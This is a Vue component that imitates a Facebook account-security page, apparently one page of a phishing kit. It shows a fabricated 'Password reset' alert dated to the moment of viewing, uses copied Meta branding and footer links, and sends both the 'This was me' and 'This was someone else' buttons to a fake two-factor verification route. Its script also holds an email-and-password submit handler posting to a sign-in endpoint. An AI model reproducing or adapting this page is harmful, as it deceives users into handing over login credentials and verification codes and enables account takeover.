<script setup lang="ts">
const email = ref('')
const password = ref('')
const router = useRouter()

const options = {
  weekday: 'long',
  year: 'numeric',
  month: 'long',
  day: 'numeric',
  hour: 'numeric',
  minute: 'numeric',
  hour12: true,
}

const handleSubmit = async () => {
  if (!email.value || !password.value) {
    return
  }

  // Call your API here
  try {
    await $fetch('/api/signin', {
      method: 'POST',
      body: JSON.stringify({ email: email.value, password: password.value }),
      headers: {
        'Content-Type': 'application/json',
      },
    })
    router.push('/two_step_verification/two_factor')
  } catch (error) {
    console.error(error)
  }
}
</script>
<template>
  <div class="flex flex-col items-center h-lvh max-h-[878px]">
    <header
      class="max-md:h-[50px] h-[83px] flex items-end justify-center"
    >
      <div class="w-full max-w-[981px] max-md:flex max-md:justify-center max-md:items-center max-md:h-full">
        <img class="max-md:w-[120px] w-[170px] md:mb-4" src="/logo-white.png" alt="" />
      </div>
    </header>

    <div
      class="max-md:mt-[calc(50px+10px)] rounded-[4px] mt-[calc(83px+20px)] md:pt-[25px] md:border border-[#ccc] md:min-w-[577px]"
    >
      <div class="max-md:mx-[10px] flex items-center md:mx-5 pb-[6px] md:border-b md:border-[#ccc]">
        <i class="icon"></i>
        <p class="md:block hidden ml-1 text-[16px] text-[#162643] font-semibold">Secure your account?</p>
        <p class="max-md:text-[14px] max-md:block hidden ml-1 text-[16px] text-[#162643] font-semibold">
          You may have performed this action yourself
        </p>
      </div>

      <div class="max-md:mx-[10px] md:px-5 md:pt-[10px]">
        <p class="text-[12px] my-[10px] max-md:mt-0">
          This action came from a network you have used before to access Facebook:
        </p>

        <p class="text-[12px]">
          <strong>Password reset</strong> on
          <strong>{{ new Date().toLocaleString('en-US', options) }}</strong>
        </p>

        <p class="text-[12px] my-[10px]">
          If this was not you, you can secure your account. You may need to pass a security
          <br class="max-md:hidden" />
          challenge, create a new password, and update your account before you can log in.
        </p>
      </div>

      <div
        class="max-md:flex-col-reverse max-md:gap-2 flex justify-end text-[12px] md:border-t py-[8px] px-[10px] md:bg-[#f2f2f2] md:border-[#ccc] mt-[10px]"
      >
        <a
          href="/two_step_verification/two_factor"
          class="btn-2 btn-mobile max-md:w-full w-fit border border-[#ccd0d5] rounded-[2px] px-[10px] flex justify-center items-center text-[#4b4f56] bg-[#f5f6f7] md:h-[28px]"
        >
          This was someone else
        </a>
        <a
          href="/two_step_verification/two_factor"
          class="btn-1 btn-mobile max-md:w-full w-fit md:ml-1 bg-[#4267b2] border border-[#4267b2] rounded-[2px] px-[10px] flex justify-center items-center text-white md:h-[28px]"
        >
          This was me
        </a>
      </div>
    </div>
    <!-- Footer Section -->
    <footer
      class="max-md:hidden mt-auto bg-white w-full flex flex-col items-center py-[28px] pb-[40px] px-10"
    >
      <div class="w-full max-w-[980px]">
        <!-- Language Links -->
        <div
          class="flex font-light justify-start flex-wrap space-x-[10px] text-gray-500 text-[12px]"
        >
          <a href="#" class="hover:underline">English (UK)</a>
          <a href="#" class="hover:underline">Tiếng Việt</a>
          <a href="#" class="hover:underline">中文(台灣)</a>
          <a href="#" class="hover:underline">한국어</a>
          <a href="#" class="hover:underline">日本語</a>
          <a href="#" class="hover:underline">Français (France)</a>
          <a href="#" class="hover:underline">ภาษาไทย</a>
          <a href="#" class="hover:underline">Español</a>
          <a href="#" class="hover:underline">Português (Brasil)</a>
          <a href="#" class="hover:underline">Deutsch</a>
          <a href="#" class="hover:underline">Italiano</a>
          <a class="plus-wrapper">
            <!-- <span class="px-2">+</span> -->
            <!-- <i class="plus"></i> -->
            <span class="text-[16px]"> + </span>
          </a>
        </div>

        <!-- Divider Line -->
        <div class="max-w-[980px] w-full border-t border-gray-300 my-[8px]"></div>

        <!-- Other Links -->
        <div
          class="max-w-[980px] font-light list-language flex flex-wrap justify-start text-gray-500 text-[12px]"
        >
          <a href="#" class="hover:underline">Sign Up</a>
          <a href="#" class="hover:underline">Log in</a>
          <a href="#" class="hover:underline">Messenger</a>
          <a href="#" class="hover:underline">Facebook Lite</a>
          <a href="#" class="hover:underline">Video</a>
          <a href="#" class="hover:underline">Places</a>
          <a href="#" class="hover:underline">Games</a>
          <a href="#" class="hover:underline">Marketplace</a>
          <a href="#" class="hover:underline">Meta Pay</a>
          <a href="#" class="hover:underline">Meta Store</a>
          <a href="#" class="hover:underline">Meta Quest</a>
          <a href="#" class="hover:underline">Ray-Ban Meta</a>
          <a href="#" class="hover:underline">Meta AI</a>
          <a href="#" class="hover:underline">Instagram</a>
          <a href="#" class="hover:underline">Threads</a>
          <a href="#" class="hover:underline">Fundraisers</a>
          <a href="#" class="hover:underline">Services</a>
          <a href="#" class="hover:underline">Voting Information Centre</a>
          <a href="#" class="hover:underline">Privacy Policy</a>
          <a href="#" class="hover:underline">Privacy Centre</a>
          <a href="#" class="hover:underline">Groups</a>
          <a href="#" class="hover:underline">About</a>
          <a href="#" class="hover:underline">AdChoices</a>
          <a href="#" class="hover:underline">Terms</a>
          <a href="#" class="hover:underline">Help</a>
          <a href="#" class="hover:underline">Contact uploading and non-users</a>
          <a href="#" class="hover:underline">Create ad</a>
          <a href="#" class="hover:underline">Create Page</a>
        </div>

        <!-- Copyright -->
        <div class="text-gray-500 font-light text-[12px] mt-3">Meta © 2025</div>
      </div>
    </footer>
  </div>
</template>
<style scoped>
/* Add any additional styling if necessary */
.list-language a {
  margin-right: 20px;
  display: inline-block;
  font-size: 12px;
}
@media only screen and (max-width: 1075px) {
  .form-main {
    height: 496px;
    margin: 0 40px;
    width: auto;
  }
}

.plus {
  background-image: url(/assets/icons/plus.png);
  background-size: 171px 55px;
  background-repeat: no-repeat;
  display: inline-block;
  font-style: italic;
  height: 16px;
  width: 16px;
  width: 12px;
  height: 12px;
  font-size: 12px;
  background-position: -100px -34px;
  -ms-high-contrast-adjust: none;
}

.plus-wrapper {
  cursor: pointer;
  display: inline-block;
  border: 1px solid;
  border-radius: 2px;
  box-sizing: content-box;
  font-size: 12px;
  -webkit-font-smoothing: antialiased;
  font-weight: bold;
  justify-content: center;
  padding: 0 8px;
  position: relative;
  text-align: center;
  text-shadow: none;
  vertical-align: middle;
  background-color: #f5f6f7;
  border-color: #ccd0d5;
  display: inline-flex;
  align-items: center;
  height: 18px;
}
header {
  background-color: #3b5998;
  background-image: linear-gradient(#4e69a2, #3b5998 50%);
  border-bottom: 1px solid #133783;
  position: relative;
  z-index: 1;
  width: 100%;
  position: fixed;
}

.icon {
  background-image: url('/icons.png');
  background-position: -38px -34px;
  -ms-high-contrast-adjust: none;
  background-size: 171px 55px;
  background-repeat: no-repeat;
  display: inline-block;
  height: 16px;
  width: 16px;
}

@media (max-width: 767px) {
  .btn-mobile {
    box-shadow:
      inset 0 0 1px rgba(0, 0, 0, 0.7),
      inset 0 1px 0 rgba(255, 255, 255, 0.3),
      0 1px 2px -1px rgba(0, 0, 0, 0.7);
      text-shadow: 0 -1px 0 rgba(0, 0, 0, .35);
      border-radius: 6px;
      padding: 8px 17px;
      line-height: 27px;
      font-size: 16px;
      font-weight: bold;
    }
  .btn-1 {
    background: linear-gradient(#647aab, #2c467e);
  }
  .btn-2 {
    background: linear-gradient(#fdfefe, #f0f1f2);
    color: #505c77;
    text-shadow: 0 1px 0 rgba(255, 255, 255, .6);
  }
}
</style>
